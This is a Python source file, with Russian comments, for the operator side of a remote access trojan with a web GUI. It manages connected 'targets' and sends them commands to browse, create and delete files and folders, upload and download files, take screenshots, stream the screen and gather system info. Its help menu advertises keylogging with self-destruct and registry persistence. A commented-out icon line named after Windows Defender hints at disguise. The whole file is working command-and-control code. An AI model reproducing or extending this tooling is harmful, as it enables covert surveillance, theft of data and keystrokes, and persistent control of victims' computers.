import socket
import json
import os

import threading

import sys
import cv2
import pickle
import numpy as np
import struct
from PIL import Image, ImageTk

import tkinter as tk
import time


### Визуализация

import eel

# ЭТО ДОЛЖНО БЫТЬ ВНАЧАЛЕ, ИНАЧЕ ОН НЕ ИНИЦИАЛИЗИРУЕТ ВСЕ ФУНКЦИИ
eel.init('web')

#####

@eel.expose
def output_to_html(value):
	eel.output(value)

@eel.expose
def output_catalog_to_html(value):
	eel.output_catalog(value)

class ScreenStream(tk.Tk):
		def __init__(self):
				super().__init__()
				self.title("Stream") 
				self.geometry('1280x720')
				#self.iconbitmap('windows_defender.ico')

				self.frame=tk.Frame(self, width=1280, height=720)
				self.frame.place(x=0, y=0) #.grid(row=0,column=0)
				self.canvas=tk.Canvas(self.frame, bg='#FFFFFF', width=1280, height=720)
				self.canvas.pack(side=tk.LEFT, expand=True, fill=tk.BOTH)

# Принимаем
def reliable_recv(target):
		data = ''
		while True:
				try:
						# Нужно декодировать в python3 (иначе будет ошибка)
						# rstrip() - чтобы не было переноса на новую строку
						data = data + target.recv(1024).decode().rstrip()
						return json.loads(data)
				except ValueError:
						continue

# Отправить команду
def reliable_send(target, data):
		jsondata = json.dumps(data)
		target.send(jsondata.encode()) # В python3 - нужен encode

# Загрузить файл на комп назначения
def upload_file(target, file_name):
		# Файл бинарный, поэтому нужно исп rb
		f = open(file_name, 'rb')
		target.send(f.read())
		#f.close()
		eel.alert_message('Файл успешно загружен')

def download_file(target, file_name):
		# Файл бинарный, поэтому нужно исп wb 
		f = open('download/' + file_name, 'wb')
		# Чтобы обнаржуить окончание загрузки файла
		# выставляем таймаут
		# Если файл закочится, цикл завершится
		target.settimeout(1)
		chunk = target.recv(1024)
		while chunk:
				f.write(chunk)
				try:
						chunk = target.recv(1024)
				except socket.timeout as e:
						break
		# Выставялем timeout=None, чтобы не было пролем с другими функциями
		target.settimeout(None)
		f.close()
		eel.alert_message('Файл успешно загружен, \
												если с ним есть какие-то проблемы (нечитаемые буквы), \
												попробуйте изменить его кодировку')


# Сделать скриншот все равно, что загрузить картинку с другого компьютера
def screenshot(target, num):
		f = open('download/screenshot_%d.png' % (num), 'wb')
		# На запас, чтобы сделать фото
		target.settimeout(3)
		chunk = target.recv(1024)
		while chunk:
				f.write(chunk)
				try:
						chunk = target.recv(1024)
				except socket.timeout as e:
						break
		# Выставялем timeout=None, чтобы не было пролем с другими функциями
		target.settimeout(None)
		f.close()

def end_session(target, num):
		global targets
		
		target.close()
		targets.remove(target)
		eel.delete_node(num)

def open_stream(target):
		#target, ip = s.accept()
		#target, ip = sock.accept()
	 
		data = b''
		payload_size = struct.calcsize("L")
		 
		while True:
				while len(data) < payload_size:
						data += target.recv(4096)
				packed_msg_size = data[:payload_size]
		 
				data = data[payload_size:]
				msg_size = struct.unpack("L", packed_msg_size)[0]
		 
				while len(data) < msg_size:
						data += target.recv(4096)
				frame_data = data[:msg_size]
				data = data[msg_size:]

				frame=pickle.loads(frame_data)
				print(frame.size)
				frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
				cv2.imshow('Stream', frame)
				cv2.waitKey(10)

# НЕЛЬЗЯ выйти из стрима
def open_stream2(target):
	data = b''
	payload_size = struct.calcsize("L")

	screen_stream = ScreenStream()

	while True:
			while len(data) < payload_size:
					data += target.recv(4096)
			packed_msg_size = data[:payload_size]

			data = data[payload_size:]
			msg_size = struct.unpack("L", packed_msg_size)[0]

			while len(data) < msg_size:
					data += target.recv(4096)
			frame_data = data[:msg_size]
			data = data[msg_size:]

			frame=pickle.loads(frame_data)
			print(frame.size)

			img = Image.fromarray(frame)#.resize((1280, 720))
			imgtk = ImageTk.PhotoImage(image=img)

			screen_stream.canvas.create_image(0, 0, anchor='nw',image=imgtk)
			screen_stream.frame.update()
			#time.sleep(0.01)
			#cv2.imshow('Stream', frame)
			#cv2.waitKey(10)

# Принимаем данные от клента
# Присоединиться к удаленной сессии
count = 0
@eel.expose
def solo_command(session_num, command):
#def target_communication(target):
		global count
		global targets
		try:
				num = int(session_num)
				target = targets[num]

				reliable_send(target, command)
				# Закрываем программу, если команда quit
				if command == 'quit':
						end_session(target, num)
				elif command == 'disconnect':
						end_session(target, num)
				elif command[:3] == 'cd ':
						result = reliable_recv(target).split(',')
						output_catalog_to_html(result)
				elif command[:2] == 'ls':
						result = reliable_recv(target).split(',')
						output_catalog_to_html(result)
				elif command[:12] == 'create_file ':
						result = reliable_recv(target).split(',')
						output_catalog_to_html(result)
				elif command[:12] == 'delete_file ':
						result = reliable_recv(target).split(',')
						output_catalog_to_html(result)
				elif command[:14] == 'create_folder ':
						result = reliable_recv(target).split(',')
						output_catalog_to_html(result)
				elif command[:14] == 'delete_folder ':
						result = reliable_recv(target).split(',')
						output_catalog_to_html(result)
				elif command[:7] == 'upload ':
						upload_file(target, command[7:])
				elif command[:9] == 'download ':
						download_file(target, command[9:])
				elif command == 'screenshot':
						screenshot(target, count)
						count += 1
				elif command[:13] == 'screen_stream':
						open_stream(target)
				elif command[:15] == 'get_system_info':
						result = reliable_recv(target).split(',')
						print_list_to_html(result)
				elif command == 'help':
						output_to_html('''<br>
							quit								--> Quit Session With Target<br>
							clear								--> Clear The Screen<br>
							cd *Directory Name*	--> Change Directory On Target<br>
							upload *file name*	--> Upload File To the target Machine<br>
							download *file name*--> Download File From target Machine<br>
							screenshot					--> Take a screenshot<br>
							keylog_start				--> Start the Keylogger<br>
							keylog_dump					--> Print Keystrokes That The Target Inputted<br>
							keylog_stop					--> Stop And Self Destruct Keylogger File<br>
							persistence *RegName* *fileName*	--> Create Persistence In The Registry (To Autoload)<br>
						''')
				else:
						result = reliable_recv(target)
						output_to_html(result)
		except:
				print('[-] No Session Under That ID Number or Bad Request')
				output_to_html('[-] No Session Under That ID Number or Bad Request')

@eel.expose
def add_tareget_to_html(num, ip):
		target = targets[num]
		reliable_send(target, 'get_system_info')
		result = reliable_recv(target).split(',')
		eel.added_new_node(num, ip, result)

def accept_conections():
		global targets
		global ips
		while True:
				if stop_flag:
						break
				sock.settimeout(1)
				try:
						target, ip = sock.accept()
						targets.append(target)
						ips.append(ip)
						print(str(ip) + ' has connected')
						output_to_html(str(ip) + ' has connected')
						add_tareget_to_html(len(targets)-1, ip)
				except:
					pass
# Связываем сокет
targets = []
ips = []
stop_flag = False
port = 5555

# IPv4 - socket.AF_INET
# TCP  - socket.SOCK_STREAM
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', port))

sock.listen(5)
t1 = threading.Thread(target=accept_conections)
t1.start()
print('[+] Waiting For The Incoming Connections')
output_to_html('[+] Waiting For The Incoming Connections')

@eel.expose
def common_command(command):
		global targets
		global stop_flag
		# Список удаленных компьютеров
		if command == 'targets':
				counter = 0
				for ip in ips:
						print('Session ' + str(counter) + ' --- ' + str(ip))
						output_to_html('Session ' + str(counter) + ' --- ' + str(ip))
						counter += 1
		# OSError: [WinError 10038] Сделана попытка выполнить операцию на объекте, не являющемся сокетом
		elif command == 'exit':
				for target in targets:
						reliable_send(target, 'disconnect')
						# Закривает сокет удаленного устройства
						target.close()
				# Закрывает свой сокет
				sock.close()
				# Устанавливаем флаг, что прервет accept_connections
				stop_flag = True
				t1.join()
				quit()
		elif command[:8] == 'sendall ':
				x = len(targets)
				print(x)
				i = 0
				try:
						while i < x:
								tarnumber = targets[i]
								print(tarnumber)
								reliable_send(tarnumber, command[8:])
								i += 1
				except:
						print('Failed')
						output_to_html('Failed')
		else:
				print('[!!] Command Doesnt Exists')
				output_to_html('[!!] Command Doesnt Exists')


#####

# ЭТО ДОЛЖНО БЫТЬ В КОНЦЕ, ИНАЧЕ ОН НЕ ИНИЦИАЛИЗИРУЕТ ВСЕ ФУНКЦИИ
eel.start('main.html')

####
""" 

##### solo_command

				# При получении следующей команды мы не закроем программу на удаленной машине
				# Но это нам позволит вернуться в Command Center
				elif command == 'back_to_center':
						pass #break
				elif command == 'clear':
						os.system('cls')

##### common_command

	elif command == 'clear':
				os.system('cls')
		# Завершаем сесси на всех устройствах
		elif command == 'exit':
				for target in targets:
						reliable_send(target, 'quit')
						# Закривает сокет удаленного устройства
						target.close()
				# Закрывает свой сокет
				sock.close()
				# Устанавливаем флаг, что прервет accept_connections
				stop_flag = True
				t1.join()
				# break
		# Разорвать сессию
		# kill 3
		# 3 - session ID
		elif command[:5] == 'kill ':
				targ = targets[int(command[5:])]
				ip = ips[int(command[5:])]
				reliable_send(targ, 'quit')
				targ.close()
				targets.remove(targ)
				ips.remove(ip)
"""